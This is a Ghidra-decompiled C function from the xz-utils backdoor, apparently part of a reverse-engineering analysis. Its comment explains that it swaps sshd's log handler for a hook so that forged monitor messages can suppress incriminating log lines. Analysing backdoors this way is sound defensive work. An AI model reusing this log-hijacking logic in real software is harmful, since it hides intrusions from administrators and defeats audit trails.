// /home/kali/xzre-ghidra/xzregh/107DE0_sshd_configure_log_hook.c
// Function: sshd_configure_log_hook @ 0x107DE0
// Calling convention: unknown
// Prototype: undefined sshd_configure_log_hook(void)


/*
 * AutoDoc: Validates that the caller supplied a log context with writable handler slots, decides whether
 * logging should be globally muted or merely filtered, and (when filtering) ensures all required
 * format strings are present. It then captures the original handler/context pair, optionally
 * rewrites them if the pointers already point inside sshd, and drops in `mm_log_handler_hook` so
 * forged monitor messages can suppress incriminating log lines.
 */
#include "xzre_types.h"


undefined8 sshd_configure_log_hook(byte *param_1,long param_2)

{
  byte bVar1;
  undefined4 *puVar2;
  ulong *puVar3;
  ulong uVar4;
  ulong *puVar5;
  ulong *puVar6;
  byte bVar7;
  ulong *ctx_slot;
  ulong *handler_slot;
  
  puVar2 = *(undefined4 **)(param_2 + 0x30);
  if (((((param_1 == (byte *)0x0) || (puVar2 == (undefined4 *)0x0)) ||
       (puVar6 = *(ulong **)(puVar2 + 0xe), puVar6 == (ulong *)0x0)) ||
      ((puVar3 = *(ulong **)(puVar2 + 0x10), puVar3 == (ulong *)0x0 ||
       (*(ulong *)(puVar2 + 0x18) == 0)))) || (puVar2[1] == 0)) {
    return 0;
  }
  bVar1 = *param_1;
  bVar7 = bVar1 & 8;
  if ((bVar7 == 0) || (*(int *)(param_2 + 0x90) == 0)) {
    uVar4 = *puVar3;
    puVar5 = puVar3;
    if ((uVar4 != 0) &&
       ((*(ulong *)(param_2 + 0x58) <= uVar4 && (uVar4 < *(ulong *)(param_2 + 0x60))))) {
      *(ulong **)(puVar2 + 0xe) = puVar3;
      *(ulong **)(puVar2 + 0x10) = puVar6;
      puVar5 = puVar6;
      puVar6 = puVar3;
    }
    uVar4 = *puVar5;
    *(ulong *)(puVar2 + 0x12) = *puVar6;
    *(ulong *)(puVar2 + 0x14) = uVar4;
    if (bVar7 == 0) {
      *puVar2 = 1;
    }
    else if ((bVar1 & 0x10) != 0) {
      if (*(long *)(puVar2 + 4) == 0) {
        return 0;
      }
      if (*(long *)(puVar2 + 6) == 0) {
        return 0;
      }
      if (*(long *)(puVar2 + 8) == 0) {
        return 0;
      }
    }
    *puVar6 = *(ulong *)(puVar2 + 0x18);
  }
  return 1;
}

